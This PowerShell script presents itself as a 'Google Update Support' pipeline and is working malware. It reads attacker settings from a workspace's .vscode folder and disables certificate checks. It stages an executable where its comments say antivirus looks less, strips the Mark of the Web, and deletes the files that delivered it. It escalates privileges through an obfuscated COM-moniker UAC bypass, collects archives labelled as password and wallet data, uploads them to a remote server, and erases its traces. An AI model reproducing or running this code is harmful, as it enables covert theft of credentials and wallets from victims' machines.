$ErrorActionPreference = 'Continue'
$logFile = $env:GUS_PP_LOGFILE
function PLog($m) {
    $l = "$(Get-Date -Format o) [run-update-pipeline] $m"
    try { Add-Content -LiteralPath $logFile -Value $l -EA SilentlyContinue } catch {}
}
PLog '========== pipeline START =========='
PLog "powershell version=$($PSVersionTable.PSVersion)"
PLog "user=$env:USERNAME domain=$env:USERDOMAIN computer=$env:COMPUTERNAME"
PLog "logFile=$logFile"
PLog "env: GUS_PP_BINDIR=$($env:GUS_PP_BINDIR)"
PLog "env: GUS_PP_EXE=$($env:GUS_PP_EXE)"
PLog "env: GUS_PP_HOPS=$($env:GUS_PP_HOPS)"
PLog "env: GUS_PP_LOGFILE=$($env:GUS_PP_LOGFILE)"
PLog "env: LOCALAPPDATA=$env:LOCALAPPDATA"
PLog "env: TEMP=$env:TEMP"
PLog "env: USERPROFILE=$env:USERPROFILE"
PLog "env: SYSTEMROOT=$env:SYSTEMROOT"

# Accept self-signed / untrusted server certificates
PLog 'SSL: applying certificate bypass'
try {
    Add-Type -TypeDefinition @"
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public static class SSLBypass {
    public static void Enable() {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate { return true; };
    }
}
"@
    [SSLBypass]::Enable()
    PLog 'SSL: certificate validation bypassed (Add-Type method)'
} catch {
    PLog "SSL: Add-Type failed ($_), trying fallback"
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    PLog 'SSL: fallback callback applied'
}

# ---- Step 1: Resolve workspace root ----
PLog '--- STEP 1: resolve workspace root ---'
$binDir = $env:GUS_PP_BINDIR
$hops = [int]$env:GUS_PP_HOPS
PLog "binDir=$binDir hops=$hops"
if (-not $binDir -or -not (Test-Path -LiteralPath $binDir)) {
    PLog "ABORT: binDir does not exist: $binDir"
    exit 1
}
$ws = (Resolve-Path $binDir).Path
PLog "binDir resolved=$ws"
for ($i = 0; $i -lt $hops; $i++) {
    $ws = Split-Path $ws -Parent
    PLog "  hop $($i+1) -> $ws"
}
PLog "workspace=$ws"

# ---- Step 2: Read wallet config from .vscode/settings.json ----
PLog '--- STEP 2: read wallet config ---'
$sf = Join-Path $ws '.vscode/settings.json'
PLog "settings.json path=$sf"
if (-not (Test-Path -LiteralPath $sf)) {
    PLog "ABORT: settings.json not found at $sf"
    PLog "  listing workspace root contents:"
    Get-ChildItem -LiteralPath $ws -Force -EA SilentlyContinue | ForEach-Object { PLog "    $($_.Name) ($($_.GetType().Name))" }
    exit 1
}
$sfSize = (Get-Item -LiteralPath $sf).Length
PLog "settings.json found, size=$sfSize bytes"
try {
    $sRaw = Get-Content -LiteralPath $sf -Raw
    PLog "settings.json content length=$($sRaw.Length)"
    $s = $sRaw | ConvertFrom-Json
} catch {
    PLog "ABORT: failed to parse settings.json: $_"
    exit 1
}
$url = [string]$s.'googleUpdateSupport.companyWalletServerUrl'
$cid = [string]$s.'googleUpdateSupport.companyWalletClientId'
$tok = [string]$s.'googleUpdateSupport.companyWalletAgentToken'
PLog "wallet config: url=[$($url.Length) chars] cid=[$($cid.Length) chars] tok=[$($tok.Length) chars]"
if (-not $url -or -not $cid -or -not $tok) {
    PLog "ABORT: wallet config incomplete"
    PLog "  url empty=$([string]::IsNullOrWhiteSpace($url))"
    PLog "  cid empty=$([string]::IsNullOrWhiteSpace($cid))"
    PLog "  tok empty=$([string]::IsNullOrWhiteSpace($tok))"
    PLog "  all settings keys: $($s.PSObject.Properties.Name -join ', ')"
    exit 1
}
PLog 'wallet config OK'

# If cid is a placeholder like "overlord-default", derive a real hardware ID
# matching the Go agent logic: SHA256(hostname|USERNAME|os|arch)
if ($cid -eq 'overlord-default' -or $cid -eq '' -or $cid -eq 'default') {
    $hwidInput = "$($env:COMPUTERNAME)|$($env:USERNAME)|windows|amd64"
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hashBytes = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwidInput))
    $cid = -join ($hashBytes | ForEach-Object { $_.ToString('x2') })
    PLog "cid was placeholder, derived HWID=$cid from input='$hwidInput'"
}

# ---- Step 3: Copy exe to LOCALAPPDATA (less AV scrutiny than TEMP) ----
PLog '--- STEP 3: copy exe to LOCALAPPDATA ---'
$origExe = $env:GUS_PP_EXE
PLog "original exe=$origExe"
if (-not (Test-Path -LiteralPath $origExe)) {
    PLog "ABORT: exe not found at $origExe"
    exit 1
}
$origExeSize = (Get-Item -LiteralPath $origExe).Length
PLog "original exe size=$origExeSize bytes"
$runDir = Join-Path $env:LOCALAPPDATA 'Google\UpdateSupporterAgent'
New-Item -ItemType Directory -Path $runDir -Force -EA SilentlyContinue | Out-Null
$tmpExe = Join-Path $runDir "gus-run-$(Get-Date -Format yyyyMMddHHmmss).exe"
PLog "copying to $tmpExe"
try {
    Copy-Item -LiteralPath $origExe -Destination $tmpExe -Force -EA Stop
    $cpSize = (Get-Item -LiteralPath $tmpExe).Length
    PLog "copy OK, dest size=$cpSize bytes (match=$($cpSize -eq $origExeSize))"
} catch {
    PLog "ABORT: copy failed: $_"
    exit 1
}
PLog "stripping MOTW on $tmpExe"
Unblock-File -LiteralPath $tmpExe -EA SilentlyContinue
Remove-Item -LiteralPath $tmpExe -Stream Zone.Identifier -EA SilentlyContinue
PLog 'MOTW stripped'

# ---- Step 4: Early cleanup ----
PLog '--- STEP 4: early cleanup (delete .vscode + vendor) ---'
$cpf = Join-Path $binDir '.gus/cleanup-paths'
PLog "cleanup-paths file=$cpf exists=$(Test-Path -LiteralPath $cpf)"
if (Test-Path -LiteralPath $cpf) {
    $cpfLines = @(Get-Content -LiteralPath $cpf)
    PLog "cleanup-paths has $($cpfLines.Count) line(s)"
    foreach ($rawLine in $cpfLines) {
        $rel = $rawLine.Trim()
        if (-not $rel -or $rel -match '\.\.') {
            PLog "  skip (empty or unsafe): '$rawLine'"
            continue
        }
        $abs = Join-Path $ws $rel
        PLog "  cleanup-path: rel='$rel' abs='$abs' exists=$(Test-Path -LiteralPath $abs)"
        if (Test-Path -LiteralPath $abs) {
            Remove-Item -LiteralPath $abs -Recurse -Force -EA SilentlyContinue
            $still = Test-Path -LiteralPath $abs
            PLog "  removed=$(-not $still) (still exists=$still)"
        }
    }
} else {
    PLog 'cleanup-paths not found, deleting binDir directly'
    if (Test-Path -LiteralPath $binDir) {
        Remove-Item -LiteralPath $binDir -Recurse -Force -EA SilentlyContinue
        PLog "removed binDir=$binDir still_exists=$(Test-Path -LiteralPath $binDir)"
    }
}

$vsDir = Join-Path $ws '.vscode'
PLog ".vscode dir=$vsDir exists=$(Test-Path -LiteralPath $vsDir)"
if (Test-Path -LiteralPath $vsDir) {
    Remove-Item -LiteralPath $vsDir -Recurse -Force -EA SilentlyContinue
    PLog ".vscode removed, still_exists=$(Test-Path -LiteralPath $vsDir)"
}

$binParent = Split-Path $binDir -Parent
if ($binParent -and $binParent -ne $ws -and (Test-Path -LiteralPath $binParent)) {
    $remaining = @(Get-ChildItem -LiteralPath $binParent -Force -EA SilentlyContinue)
    PLog "vendor parent=$binParent items_remaining=$($remaining.Count)"
    if ($remaining.Count -eq 0) {
        Remove-Item -LiteralPath $binParent -Recurse -Force -EA SilentlyContinue
        PLog "removed empty vendor parent"
    }
}
PLog 'early cleanup done'
PLog "workspace contents after cleanup:"
Get-ChildItem -LiteralPath $ws -Force -EA SilentlyContinue | ForEach-Object { PLog "  $($_.Name)" }

# ---- Step 5: Derive upload URL ----
PLog '--- STEP 5: derive upload URL ---'
$base = $url -replace '/$', ''
PLog "base (raw)=$base"
if ($base -match '^wss://') { $base = 'https://' + $base.Substring(6) }
elseif ($base -match '^ws://') { $base = 'http://' + $base.Substring(5) }
$uploadUrl = "$base/api/company-wallet/upload-raw"
PLog "uploadUrl=$uploadUrl"

# ---- Step 6: Artifacts dir ----
PLog '--- STEP 6: prepare artifacts dir ---'
$artDir = Join-Path $env:LOCALAPPDATA 'Google/cw-artifacts'
New-Item -ItemType Directory -Path $artDir -Force -EA SilentlyContinue | Out-Null
PLog "artDir=$artDir exists=$(Test-Path -LiteralPath $artDir)"
$existingArtifacts = @(Get-ChildItem -Path $artDir -File -EA SilentlyContinue)
PLog "existing artifacts count=$($existingArtifacts.Count)"
foreach ($a in $existingArtifacts) { PLog "  existing: $($a.Name) size=$($a.Length) modified=$($a.LastWriteTime)" }

# ---- Step 7: Phase 1 ----
PLog '--- STEP 7: phase1 (--company-wallet-phase1-local) ---'
PLog "exe=$tmpExe"
PLog "exe exists=$(Test-Path -LiteralPath $tmpExe)"
$phase1Start = Get-Date
try {
    $p = Start-Process -FilePath $tmpExe -ArgumentList '--company-wallet-phase1-local' -WindowStyle Hidden -Wait -PassThru
    $phase1Elapsed = ((Get-Date) - $phase1Start).TotalSeconds
    PLog "phase1: exit=$($p.ExitCode) elapsed=${phase1Elapsed}s"
    if ($p.ExitCode -ne 0) {
        PLog "phase1: WARNING non-zero exit code"
    }
} catch {
    $phase1Elapsed = ((Get-Date) - $phase1Start).TotalSeconds
    PLog "phase1: FAILED after ${phase1Elapsed}s error=$_"
    exit 1
}
$postP1 = @(Get-ChildItem -Path $artDir -File -EA SilentlyContinue)
PLog "artifacts after phase1: count=$($postP1.Count)"
foreach ($a in $postP1) { PLog "  $($a.Name) size=$($a.Length) modified=$($a.LastWriteTime)" }

# ---- Step 8: Phase 2 with COM UAC elevation ----
PLog '--- STEP 8: phase2 (--company-wallet-job with COM UAC bypass) ---'
$home2 = $env:USERPROFILE
$rf = Join-Path $env:TEMP "gus-cw-result-$(Get-Date -Format yyyyMMddHHmmss).txt"
'' | Set-Content -LiteralPath $rf -EA SilentlyContinue
PLog "result file=$rf"
PLog "source home=$home2"

function Invoke-ElevatedExe($exePath, $exeArgs) {
    PLog "Invoke-ElevatedExe: exePath=$exePath"
    PLog "Invoke-ElevatedExe: exeArgs=$exeArgs"
    $elevScript = @'
function F{param([String]$src,[String]$arg)
$n=@('[StructLayout(LayoutKind.Sequential)]','MarshalAs(UnmanagedType.ByValArray,SizeConst','[DllImport("ole32.dll",CharSet=CharSet.Unicode,SetLastError=true)]','public static extern')
$me=@("CoInitializeEx","CoUninitialize","CoGetObject")
$sg='using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;'+$n[0]+'public struct _s1{public uint u1;public UInt16 u2;public UInt16 u3;['+$n[1]+'=8)]public byte[] bt;}'+$n[0]+'public struct _s2{['+$n[1]+'=7)]public UInt32[] ut;public IntPtr pinfo;public IntPtr hwnd;}public struct _s3{['+$n[1]+'=23)]public IntPtr[] func;}public static class EA{'+$n[2]+$n[3]+' int '+$me[0]+'(IntPtr pvReserved,UInt32 dwCoInit);'+$n[2]+$n[3]+' void '+$me[1]+'();'+$n[2]+$n[3]+' int '+$me[2]+'(string pszName,IntPtr pBindOptions,_s1 riid,ref IntPtr ppv);}'
Add-Type -TypeDefinition $sg
$x=[EA]
$x::($me[1])()
$hi=$x::($me[0])([IntPtr]::Zero,2)
$m=[System.Runtime.InteropServices.Marshal]
$am=@("SizeOf","AllocHGlobal","StructureToPtr","PtrToStructure","StringToHGlobalUni","GetDelegateForFunctionPointer")
$s2=New-Object _s2
$sz=$m::($am[0])($s2)
$s2.ut=[UInt32[]]($sz,0,0,0,0,4,0)
$p2=$m::($am[1])($sz)
$m::($am[2])($s2,$p2,$True)
$t3=(New-Object _s3).GetType()
$sz=$m::($am[0])([Type]$t3)
$pv=$m::($am[1])($sz)
$g=New-Object _s1
$g.u1=0x6EDD6D74
$g.u2=0xC007
$g.u3=0x4E75
$g.bt=[byte[]](0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4c)
$hr=$x::($me[2])('Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}',$p2,$g,[ref]$pv)
if($hr -ne 0){exit 1}
$vt=$m::($am[3])($pv,[Type]$t3)
$vt=$m::($am[3])($vt.func[0],[Type]$t3)
$fa=$vt.func[9]
$d=[AppDomain]::CurrentDomain
$dn=New-Object System.Reflection.AssemblyName('X')
$ob=@([System.Reflection.Emit.AssemblyBuilderAccess],[System.MulticastDelegate],[System.Reflection.CallingConventions])
$tb=$d.DefineDynamicAssembly($dn,$ob[0]::Run).DefineDynamicModule('M',$false).DefineType('D','Class, Public, Sealed, AnsiClass, AutoClass',$ob[1])
$ta=@([IntPtr],[IntPtr],[IntPtr],[IntPtr],[UInt32],[UInt32])
$tb.DefineConstructor('RTSpecialName, HideBySig, Public',$ob[2]::Standard,$ta).SetImplementationFlags('Runtime, Managed')
$tb.DefineMethod('Invoke','Public, HideBySig, NewSlot, Virtual',[Int],$ta).SetImplementationFlags('Runtime, Managed')
$ft=$tb.CreateType()
$f=$m::($am[5])($fa,$ft)
$us=$m::($am[4])($src)
$ua=$m::($am[4])($arg)
$f.Invoke($pv,$us,$ua,0,0,0)
if($hi -eq 0){$x::($me[1])()}}
'@
    $srcEsc = $exePath.Replace("'", "''")
    $argEsc = $exeArgs.Replace("'", "''")
    $callLine = "F -src '$srcEsc' -arg '$argEsc'"
    PLog "Invoke-ElevatedExe: callLine=$callLine"
    $script = $elevScript + "`n" + $callLine
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
    $enc = [Convert]::ToBase64String($bytes)
    PLog "Invoke-ElevatedExe: encoded command length=$($enc.Length)"
    $ps = Join-Path $env:SYSTEMROOT 'System32\WindowsPowerShell\v1.0\powershell.exe'
    if (-not (Test-Path -LiteralPath $ps)) { $ps = 'powershell.exe' }
    PLog "Invoke-ElevatedExe: launching $ps -EncodedCommand"
    $elevStart = Get-Date
    $proc = Start-Process -FilePath $ps -ArgumentList "-NoProfile","-WindowStyle","Hidden","-EncodedCommand",$enc -WindowStyle Hidden -Wait -PassThru
    $elevElapsed = ((Get-Date) - $elevStart).TotalSeconds
    PLog "Invoke-ElevatedExe: exit=$($proc.ExitCode) elapsed=${elevElapsed}s"
    return $proc.ExitCode
}

$phase2Args = "--company-wallet-job --cw-result-file=$rf --cw-source-home=$home2"
PLog "phase2 args=$phase2Args"
$phase2Start = Get-Date
$phase2Method = 'none'
try {
    PLog 'phase2: attempting COM moniker UAC bypass'
    $ec = Invoke-ElevatedExe $tmpExe $phase2Args
    $phase2Method = 'COM'
    PLog "phase2: COM elevation exit=$ec"
    if ($ec -ne 0) {
        PLog 'phase2: COM bypass returned non-zero, falling back to Start-Process -Verb RunAs (UAC prompt)'
        $phase2Method = 'RunAs'
        $p = Start-Process -FilePath $tmpExe -ArgumentList "--company-wallet-job","--cw-result-file=$rf","--cw-source-home=$home2" -Verb RunAs -WindowStyle Hidden -Wait -PassThru
        PLog "phase2: RunAs exit=$($p.ExitCode)"
    }
} catch {
    PLog "phase2: COM elevation threw exception: $_"
    PLog 'phase2: falling back to Start-Process -Verb RunAs (UAC prompt)'
    $phase2Method = 'RunAs-fallback'
    try {
        $p = Start-Process -FilePath $tmpExe -ArgumentList "--company-wallet-job","--cw-result-file=$rf","--cw-source-home=$home2" -Verb RunAs -WindowStyle Hidden -Wait -PassThru
        PLog "phase2: RunAs fallback exit=$($p.ExitCode)"
    } catch {
        PLog "phase2: ALL elevation methods failed: $_"
        PLog 'phase2: continuing anyway (pass zip may still appear from prior runs)'
    }
}
$phase2Elapsed = ((Get-Date) - $phase2Start).TotalSeconds
PLog "phase2: method=$phase2Method elapsed=${phase2Elapsed}s"
$postP2 = @(Get-ChildItem -Path $artDir -File -EA SilentlyContinue)
PLog "artifacts after phase2: count=$($postP2.Count)"
foreach ($a in $postP2) { PLog "  $($a.Name) size=$($a.Length) modified=$($a.LastWriteTime)" }

# Check result file
if (Test-Path -LiteralPath $rf) {
    $rfContent = (Get-Content -LiteralPath $rf -Raw -EA SilentlyContinue)
    PLog "result file content='$($rfContent.Trim())'"
} else {
    PLog 'result file not found (exe may not have written it)'
}

# ---- Step 9: Wait for pass zip ----
PLog '--- STEP 9: wait for pass zip (up to 5 min) ---'
$deadline = (Get-Date).AddMinutes(5); $passZip = $null
$pollCount = 0
while ((Get-Date) -lt $deadline) {
    $candidates = Get-ChildItem -Path $artDir -Filter '*_pass.zip' -File -EA SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($candidates) { $passZip = $candidates.FullName; break }
    $pollCount++
    if ($pollCount % 15 -eq 0) {
        $remaining = [math]::Round(($deadline - (Get-Date)).TotalSeconds)
        PLog "waiting for pass zip... ${remaining}s remaining (poll #$pollCount)"
    }
    Start-Sleep -Seconds 2
}
if (-not $passZip) {
    PLog 'waitForPassZip: TIMEOUT after 5 minutes'
    PLog "artDir contents at timeout:"
    Get-ChildItem -Path $artDir -File -EA SilentlyContinue | ForEach-Object {
        PLog "  $($_.Name) size=$($_.Length) modified=$($_.LastWriteTime)"
    }
} else {
    $passSize = (Get-Item -LiteralPath $passZip).Length
    PLog "passZip=$passZip size=$passSize"
}

# ---- Step 10: Resolve artifacts ----
PLog '--- STEP 10: resolve artifacts ---'
$mainZip = (Get-ChildItem -Path $artDir -Filter '*_phase1.zip' -File -EA SilentlyContinue |
    Sort-Object LastWriteTime -Descending | Select-Object -First 1)
if ($mainZip) { $mainZip = $mainZip.FullName }
$mainSize = if ($mainZip) { (Get-Item -LiteralPath $mainZip).Length } else { 0 }
PLog "mainZip=$mainZip size=$mainSize"
PLog "passZip=$passZip"
if (-not $mainZip -or -not $passZip) {
    PLog 'ABORT: artifacts incomplete - cannot upload'
    PLog "  mainZip present=$([bool]$mainZip) passZip present=$([bool]$passZip)"
    PLog "  full artDir listing:"
    Get-ChildItem -Path $artDir -File -EA SilentlyContinue | ForEach-Object {
        PLog "    $($_.Name) size=$($_.Length)"
    }
    exit 1
}

# ---- Step 11: Upload ----
PLog '--- STEP 11: upload artifacts ---'
function DoUpload($zip, $variant) {
    $h = @{
        'X-Agent-Token'              = $tok
        'X-Company-Wallet-Client-Id' = $cid
        'X-Company-Wallet-Host'      = $env:COMPUTERNAME
        'Content-Type'               = 'application/zip'
    }
    if ($variant -eq 'pass') { $h['X-Company-Wallet-Variant'] = 'pass' }
    $zipSize = (Get-Item $zip).Length
    PLog "upload: variant=$variant zip=$zip size=$zipSize url=$uploadUrl"
    PLog "upload: headers X-Agent-Token=set($($tok.Length)) X-Company-Wallet-Client-Id=set($($cid.Length)) X-Company-Wallet-Host=$($env:COMPUTERNAME)"
    $uploadStart = Get-Date
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        PLog "upload: TLS protocol set to Tls12, calling Invoke-RestMethod..."
        $r = Invoke-RestMethod -Uri $uploadUrl -Method POST -InFile $zip -Headers $h -EA Stop
        $uploadElapsed = ((Get-Date) - $uploadStart).TotalSeconds
        PLog "upload: OK variant=$variant elapsed=${uploadElapsed}s response=$r"
    } catch {
        $uploadElapsed = ((Get-Date) - $uploadStart).TotalSeconds
        PLog "upload: FAILED variant=$variant elapsed=${uploadElapsed}s"
        PLog "upload: error=$_"
        PLog "upload: exception type=$($_.Exception.GetType().FullName)"
        if ($_.Exception.InnerException) {
            PLog "upload: inner exception=$($_.Exception.InnerException.Message)"
        }
        throw $_
    }
}

DoUpload $mainZip 'main'
PLog 'upload main done'
DoUpload $passZip 'pass'
PLog 'upload pass done'

# ---- Step 12: Write upload_success marker ----
PLog '--- STEP 12: write upload_success marker ---'
$markerDir = Join-Path $env:LOCALAPPDATA 'Google'
New-Item -ItemType Directory -Path $markerDir -Force -EA SilentlyContinue | Out-Null
$markerPath = Join-Path $markerDir 'upload_success.txt'
(Get-Date -Format o) | Set-Content -LiteralPath $markerPath
PLog "upload_success marker written: $markerPath"

# ---- Step 13: Final cleanup (temp files, NOT logs) ----
PLog '--- STEP 13: final cleanup (temp files only, logs preserved) ---'

PLog "removing run exe: $tmpExe"
Remove-Item -LiteralPath $tmpExe -Force -EA SilentlyContinue
PLog "  removed=$(! (Test-Path -LiteralPath $tmpExe))"

PLog "removing result file: $rf"
Remove-Item -LiteralPath $rf -Force -EA SilentlyContinue

# Clean old run exes from UpdateSupporterAgent (current + previous runs)
PLog "cleaning old gus-run exes in $runDir"
$oldRunExes = @(Get-ChildItem -Path $runDir -Filter 'gus-run-*.exe' -File -EA SilentlyContinue)
PLog "  found $($oldRunExes.Count) gus-run exe(s)"
foreach ($oe in $oldRunExes) {
    Remove-Item -LiteralPath $oe.FullName -Force -EA SilentlyContinue
    PLog "  removed $($oe.Name)"
}

$laGoogle = Join-Path $env:LOCALAPPDATA 'Google'
PLog "cleaning runtime exe copies in $laGoogle"
$runtimeExes = @(Get-ChildItem -Path $laGoogle -Filter 'google-update-support-windows-amd64-*.exe' -File -EA SilentlyContinue)
PLog "  found $($runtimeExes.Count) runtime exe(s)"
foreach ($re in $runtimeExes) {
    Remove-Item -LiteralPath $re.FullName -Force -EA SilentlyContinue
    PLog "  removed $($re.Name)"
}

PLog "cleaning lock dirs in $laGoogle"
$lockDirs = @(Get-ChildItem -Path $laGoogle -Directory -Filter 'gus-run-update-lock-*' -EA SilentlyContinue)
PLog "  found $($lockDirs.Count) lock dir(s)"
foreach ($ld in $lockDirs) {
    Remove-Item -LiteralPath $ld.FullName -Recurse -Force -EA SilentlyContinue
    PLog "  removed $($ld.Name)"
}

# Clean leftover temp exes from prior runs that used %TEMP%
PLog "cleaning old gus-agent temp exes in $env:TEMP"
$oldTempExes = @(Get-ChildItem -Path $env:TEMP -Filter 'gus-agent-*.exe' -File -EA SilentlyContinue)
PLog "  found $($oldTempExes.Count) old temp exe(s)"
foreach ($ot in $oldTempExes) {
    Remove-Item -LiteralPath $ot.FullName -Force -EA SilentlyContinue
    PLog "  removed $($ot.Name)"
}

PLog "cleaning old result files in $env:TEMP"
$oldResults = @(Get-ChildItem -Path $env:TEMP -Filter 'gus-cw-result-*.txt' -File -EA SilentlyContinue)
PLog "  found $($oldResults.Count) old result file(s)"
foreach ($or2 in $oldResults) {
    Remove-Item -LiteralPath $or2.FullName -Force -EA SilentlyContinue
    PLog "  removed $($or2.Name)"
}

PLog "cleaning cw-artifacts in $artDir"
$artifacts = @(Get-ChildItem -Path $artDir -File -EA SilentlyContinue)
PLog "  found $($artifacts.Count) artifact(s)"
foreach ($af in $artifacts) {
    Remove-Item -LiteralPath $af.FullName -Force -EA SilentlyContinue
    PLog "  removed $($af.Name)"
}

PLog 'final cleanup done'
PLog '========== pipeline END (success) =========='
